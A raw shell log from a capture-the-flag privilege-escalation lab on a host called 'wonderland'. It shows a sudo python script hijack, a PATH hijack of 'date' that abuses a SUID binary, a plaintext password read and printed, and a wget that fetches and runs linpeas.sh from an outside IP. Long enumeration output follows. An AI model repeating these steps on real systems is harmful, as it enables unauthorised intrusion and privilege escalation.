alice@wonderland:~$ nano random.py
alice@wonderland:~$ ls
random.py  root.txt 
alice@wonderland:~$ 
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/random.py
Sorry, user alice is not allowed to execute '/usr/bin/python3.6 /home/alice/random.py' as rabbit on wonderland.
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$ sudo -u rabbit
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] file ...
alice@wonderland:~$ clear




alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
_carpenter.pyand:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the 
rabbit@wonderland:~$ 
rabbit@wonderland:~$ 
rabbit@wonderland:~$ 
rabbit@wonderland:~$ whoami
rabbit
rabbit@wonderland:~$ ls
random.py  root.txt  walrus_and_the_carpenter.py
rabbit@wonderland:~$ cd /home/rabbit
rabbit@wonderland:/home/rabbit$ ls
teaParty
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 22 Sep 2021 13:55:55 +0000
Ask very nicely, and I will give you some tea while you wait for him
plsae^H^H^H
Segmentation fault (core dumped)
rabbit@wonderland:/home/rabbit$ sudo -l
[sudo] password for rabbit: 


Sorry, try again.
[sudo] password for rabbit: 
Sorry, try again.
[sudo] password for rabbit: 


sudo: 3 incorrect password attempts
rabbit@wonderland:/home/rabbit$ 
rabbit@wonderland:/home/rabbit$ 
rabbit@wonderland:/home/rabbit$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
rabbit@wonderland:/home/rabbit$ ls
teaParty
rabbit@wonderland:/home/rabbit$ nano date
Unable to create directory /home/alice/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

rabbit@wonderland:/home/rabbit$ echo PATH
rabbit@wonderland:/home/rabbit$                                                                                                                                   
rabbit@wonderland:/home/rabbit$                                                                                                                                   
rabbit@wonderland:/home/rabbit$                                                                                                                                   
rabbit@wonderland:/home/rabbit$                                                                                                                                   
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ echo PATH                                                                                                                         
PATH                                                                                                                                                              
rabbit@wonderland:/home/rabbit$ echo $PATH                                                                                                                        
/home/rabbit:/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                  
rabbit@wonderland:/home/rabbit$ chmod +x date                                                                                                                     
rabbit@wonderland:/home/rabbit$ ls -l                                                                                                                             
total 24                                                                                                                                                          
-rwxr-xr-x 1 rabbit rabbit    10 Sep 22 13:12 date                                                                                                                
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty                                                                                                            
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
hatter@wonderland:/home/rabbit$ 
hatter@wonderland:/home/rabbit$ which perl
hatter@wonderland:/home/rabbit$ perl
bash: /usr/bin/perl: Permission denied
hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
hatter@wonderland:/home/rabbit$ cd home
bash: cd: home: No such file or directory
hatter@wonderland:/home/rabbit$ cd /home
hatter@wonderland:/home$ ls
alice  hatter  rabbit  tryhackme
hatter@wonderland:/home$ cd hatter
hatter@wonderland:/home/hatter$ ls
password.txt
hatter@wonderland:/home/hatter$ cat password.txt
WhyIsARavenLikeAWritingDesk?
hatter@wonderland:/home/hatter$ su hatter
Password: 
hatter@wonderland:~$ 
hatter@wonderland:~$ 
hatter@wonderland:~$ ls
password.txt
hatter@wonderland:~$ id
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
hatter@wonderland:~$ sudo -l
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.
hatter@wonderland:~$ wget http:10.6.101.121/linpeas.sh
--2021-09-22 13:28:19--  ftp://http/10.6.101.121/linpeas.sh
           => ‘linpeas.sh’
Resolving http (http)... failed: Temporary failure in name resolution.
wget: unable to resolve host address ‘http’
hatter@wonderland:~$ wget http://10.6.101.121/linpeas.sh
--2021-09-22 13:28:39--  http://10.6.101.121/linpeas.sh
Connecting to 10.6.101.121:80... failed: Connection refused.
hatter@wonderland:~$ wget http://10.6.101.121:8080/linpeas.sh
--2021-09-22 13:29:00--  http://10.6.101.121:8080/linpeas.sh
Connecting to 10.6.101.121:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 451118 (441K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 440.54K   115KB/s    in 3.8s    

2021-09-22 13:29:05 (115 KB/s) - ‘linpeas.sh’ saved [451118/451118]

hatter@wonderland:~$ ls
linpeas.sh  password.txt
hatter@wonderland:~$ chmod +x linpeas.sh 
hatter@wonderland:~$ ./linpeas.sh 


                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
        ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
              ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

       /---------------------------------------------------------------------------\
       |                             Do you like PEASS?                            |                                                                     
       |---------------------------------------------------------------------------|                                                                     
       |         Become a Patreon    :     https://www.patreon.com/peass           |                                                                     
       |         Follow on Twitter   :     @carlospolopm                           |                                                                     
       |         Respect on HTB      :     SirBroccoli & makikvues                 |                                                                     
       |---------------------------------------------------------------------------|                                                                     
       |                                 Thank you!                                |                                                                     
       \---------------------------------------------------------------------------/                                                                     
  linpeas-ng by carlospolop                                                                                                                              
                                                                                                                                                         
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                          
                                                                                                                                                         
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                 
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

════════════════════════════════════╣ Basic information ╠════════════════════════════════════
OS: Linux version 4.15.0-101-generic (buildd@lgw01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020
User & Groups: uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
Hostname: wonderland
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                            
                                                                                                                                                         

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                                                         
════════════════════════════════════╣ System Information ╠════════════════════════════════════
╔══════════╣ Operative system                                                                                                                            
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                            
Linux version 4.15.0-101-generic (buildd@lgw01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                               
Sudo version 1.8.21p2                                                                                                                                    

╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                               
                                                                                                                                                         
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                       
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games                                                                 
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

╔══════════╣ Date & uptime
Wed Sep 22 13:29:54 UTC 2021                                                                                                                             
 13:29:54 up  2:20,  1 user,  load average: 0.22, 0.05, 0.02

╔══════════╣ System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                                                         
udev            209M     0  209M   0% /dev
tmpfs            48M  596K   47M   2% /run
/dev/xvda2       20G  3.8G   15G  20% /
tmpfs           238M     0  238M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           238M     0  238M   0% /sys/fs/cgroup
tmpfs            48M     0   48M   0% /run/user/1001
              total        used        free      shared  buff/cache   available
Mem:         486628      107332       81304         596      297992      366784
Swap:             0           0           0

╔══════════╣ CPU info
Architecture:        x86_64                                                                                                                              
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
CPU(s):              1
On-line CPU(s) list: 0
Thread(s) per core:  1
Core(s) per socket:  1
Socket(s):           1
NUMA node(s):        1
Vendor ID:           GenuineIntel
CPU family:          6
Model:               63
Model name:          Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
Stepping:            2
CPU MHz:             2400.027
BogoMIPS:            4800.04
Hypervisor vendor:   Xen
Virtualization type: full
L1d cache:           32K
L1i cache:           32K
L2 cache:            256K
L3 cache:            30720K
NUMA node0 CPU(s):   0
Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp lm constant_tsc rep_good nopl xtopology cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm cpuid_fault invpcid_single pti fsgsbase bmi1 avx2 smep bmi2 erms invpcid xsaveopt

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                  
SUDO_GID=1001                                                                                                                                            
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/hatter
USER=hatter
SHLVL=3
OLDPWD=/home
HOME=/home/hatter
SUDO_UID=1001
LOGNAME=hatter
_=./linpeas.sh
USERNAME=rabbit
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
LANG=C.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SUDO_COMMAND=/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
SUDO_USER=alice
PWD=/home/hatter
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmseg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                        
dmesg Not Found                                                                                                                                          
                                                                                                                                                         
╔══════════╣ Linux Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                            
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                        
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                 
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                   
═╣ Is ASLR enabled? ............... Yes                                                                                                                  
═╣ Printer? ....................... lpstat Not Found
═╣ Is this a virtual machine? ..... Yes (xen)                                                                                                            

════════════════════════════════════╣ Containers ╠════════════════════════════════════
╔══════════╣ Container related tools present                                                                                                             
╔══════════╣ Container details                                                                                                                           
═╣ Is this a container? ........... No                                                                                                                   
═╣ Any running containers? ........ No                                                                                                                   
                                                                                                                                                         
════════════════════════════════════╣ Devices ╠════════════════════════════════════
╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)                                                                                                      
disk                                                                                                                                                     

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                
/dev/disk/by-uuid/5912509f-213a-4678-8cde-b5f23b16f8ce  /       ext4    defaults        0 0                                                              

╔══════════╣ Mounted disks information
diskutil Not Found                                                                                                                                       
                                                                                                                                                         
╔══════════╣ Mounted SMB Shares
smbutil Not Found                                                                                                                                        
                                                                                                                                                         

════════════════════════════════════╣ Available Software ╠════════════════════════════════════
╔══════════╣ Useful software                                                                                                                             
                                                                                                                                                         
╔══════════╣ Installed Compiler
/usr/share/gcc-8                                                                                                                                         


════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════
╔══════════╣ Cleaned processes                                                                                                                           
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                   
root         1  0.3  1.8 159704  8948 ?        Ss   11:09   0:28 /sbin/init maybe-ubiquity                                                               
root       407  0.0  4.9 143976 24200 ?        S<s  11:10   0:02 /lib/systemd/systemd-journald
root       417  0.0  0.3  97708  1720 ?        Ss   11:10   0:00 /sbin/lvmetad -f
root       425  0.0  0.9  45608  4428 ?        Ss   11:10   0:05 /lib/systemd/systemd-udevd
systemd+   493  0.0  0.6 141936  3208 ?        Ssl  11:10   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   607  0.0  1.1  80060  5404 ?        Ss   11:11   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   615  0.0  1.1  70640  5416 ?        Ss   11:11   0:00 /lib/systemd/systemd-resolved
syslog     694  0.0  0.8 263036  4332 ?        Ssl  11:11   0:00 /usr/sbin/rsyslogd -n
root       698  0.0  0.6  30104  3168 ?        Ss   11:11   0:00 /usr/sbin/cron -f
tryhack+   700  0.0  1.5 409464  7600 ?        Ssl  11:11   0:04 /home/tryhackme/server -p 80
  └─(Caps) 0x0000000000000400=cap_net_bind_service
root       706  0.0  3.5 169188 17136 ?        Ssl  11:11   0:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       713  0.0  0.3 530892  1516 ?        Ssl  11:11   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       715  0.0  1.2  70596  5980 ?        Ss   11:11   0:00 /lib/systemd/systemd-logind
daemon[0m     717  0.0  0.4  28332  2416 ?        Ss   11:11   0:00 /usr/sbin/atd -f
root       724  0.0  1.4 286356  6868 ?        Ssl  11:11   0:00 /usr/lib/accountsservice/accounts-daemon[0m
message+   725  0.0  0.9  50056  4616 ?        Ss   11:11   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       745  0.0  1.3  72300  6376 ?        Ss   11:11   0:00 /usr/sbin/sshd -D
alice     1252  0.0  1.1 108124  5700 ?        S    12:03   0:00      _ sshd: alice@pts/0
alice     1256  0.0  1.0  21468  4972 pts/0    Ss   12:03   0:00          _ -bash
alice     1286  0.0  1.9  39164  9732 pts/0    S+   12:06   0:00              _ python3 -c import pty;pty.spawn ("/bin/bash")
alice     1287  0.0  1.0  21364  4984 pts/1    Ss   12:06   0:00                  _ /bin/bash
root      1353  0.0  0.8  62324  4152 pts/1    S    12:55   0:00                      _ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit    1354  0.0  1.9  28624  9440 pts/1    S    12:55   0:00                          _ /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit    1355  0.0  0.1   4628   848 pts/1    S    12:55   0:00                              _ sh -c /bin/bash
rabbit    1356  0.0  0.9  21356  4832 pts/1    S    12:55   0:00                                  _ /bin/bash
hatter    1388  0.0  0.1   4516   708 pts/1    S    13:16   0:00                                      _ ./teaParty
hatter    1389  0.0  0.1   4628   812 pts/1    S    13:16   0:00                                          _ sh -c /bin/echo -n 'Probably by ' && date --date='next hour' -R
hatter    1391  0.0  0.1   4628   872 pts/1    S    13:16   0:00                                              _ /bin/sh /home/rabbit/date --date=next hour -R
hatter    1392  0.0  1.0  21364  4896 pts/1    S    13:16   0:00                                                  _ /bin/bash
root      1411  0.0  0.7  61828  3740 pts/1    S    13:19   0:00                                                      _ su hatter
hatter    1412  0.0  1.0  21496  5048 pts/1    S    13:19   0:00                                                          _ bash
hatter    1436  0.0  0.4   5272  2384 pts/1    S+   13:29   0:00                                                              _ /bin/sh ./linpeas.sh
hatter    2508  0.0  0.1   5272   792 pts/1    S+   13:29   0:00                                                                  _ /bin/sh ./linpeas.sh
hatter    2512  0.0  0.7  38608  3644 pts/1    R+   13:29   0:00                                                                  |   _ ps fauxwww
hatter    2511  0.0  0.1   5272   792 pts/1    S+   13:29   0:00                                                                  _ /bin/sh ./linpeas.sh
root       751  0.0  4.1 186032 20172 ?        Ssl  11:11   0:01 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       758  0.0  1.4 291452  7196 ?        Ssl  11:11   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       765  0.0  0.4  14768  2384 ttyS0    Ss+  11:11   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       766  0.0  0.3  13244  1940 tty1     Ss+  11:11   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
alice     1121  0.0  1.4  76676  7192 ?        Ss   12:03   0:00 /lib/systemd/systemd --user
alice     1123  0.0  0.4 193684  2392 ?        S    12:03   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                  
1.1M -rwxr-xr-x 1 root root 1.1M Jun  6  2019 /bin/bash                                                                                                  
   0 lrwxrwxrwx 1 root root    4 Feb  3  2020 /bin/sh -> dash
1.6M -rwxr-xr-x 1 root root 1.6M Apr 20  2020 /lib/systemd/systemd
128K -rwxr-xr-x 1 root root 127K Apr 20  2020 /lib/systemd/systemd-journald
216K -rwxr-xr-x 1 root root 215K Apr 20  2020 /lib/systemd/systemd-logind
1.6M -rwxr-xr-x 1 root root 1.6M Apr 20  2020 /lib/systemd/systemd-networkd
372K -rwxr-xr-x 1 root root 371K Apr 20  2020 /lib/systemd/systemd-resolved
 40K -rwxr-xr-x 1 root root  39K Apr 20  2020 /lib/systemd/systemd-timesyncd
572K -rwxr-xr-x 1 root root 571K Apr 20  2020 /lib/systemd/systemd-udevd
 56K -rwxr-xr-x 1 root root  56K Mar  5  2020 /sbin/agetty
   0 lrwxrwxrwx 1 root root   20 Apr 20  2020 /sbin/init -> /lib/systemd/systemd
 84K -rwxr-xr-x 1 root root  83K Jan 23  2020 /sbin/lvmetad
232K -rwxr-xr-x 1 root root 232K Jun 10  2019 /usr/bin/dbus-daemon[0m
 20K -rwxr-xr-x 1 root root  19K Mar 31  2020 /usr/bin/lxcfs
   0 lrwxrwxrwx 1 root root    9 Oct 25  2018 /usr/bin/python3 -> python3.6
4.4M -rwxr-xr-x 2 root root 4.4M Apr 18  2020 /usr/bin/python3.6
180K -rwxr-xr-x 1 root root 179K Dec 18  2017 /usr/lib/accountsservice/accounts-daemon[0m
 16K -rwxr-xr-x 1 root root  15K Mar 27  2019 /usr/lib/policykit-1/polkitd
 28K -rwxr-xr-x 1 root root  27K Feb 20  2018 /usr/sbin/atd
 48K -rwxr-xr-x 1 root root  47K Nov 16  2017 /usr/sbin/cron
668K -rwxr-xr-x 1 root root 665K Apr 24  2018 /usr/sbin/rsyslogd
772K -rwxr-xr-x 1 root root 769K Mar  4  2019 /usr/sbin/sshd

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                       
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF    NODE NAME                                                                         

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                            
gdm-password Not Found                                                                                                                                   
gnome-keyring-daemon Not Found                                                                                                                           
lightdm Not Found                                                                                                                                        
vsftpd Not Found                                                                                                                                         
apache2 Not Found                                                                                                                                        
sshd: process found (dump creds from memory as root)                                                                                                     

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                        
/usr/bin/crontab                                                                                                                                         
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab                                                                                                 

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 91 root root 4096 May 25  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  589 Jan 14  2020 mdadm
-rw-r--r--  1 root root  191 Feb  3  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 May 25  2020 .
drwxr-xr-x 91 root root 4096 May 25  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 91 root root 4096 May 25  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 91 root root 4096 May 25  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Feb  3  2020 .
drwxr-xr-x 91 root root 4096 May 25  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


╔══════════╣ Services
╚ Search for outdated versions                                                                                                                           
 [ - ]  acpid                                                                                                                                            
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  ebtables
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ - ]  irqbalance
 [ + ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ - ]  mdadm
 [ - ]  mdadm-waitidle
 [ - ]  open-iscsi
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                
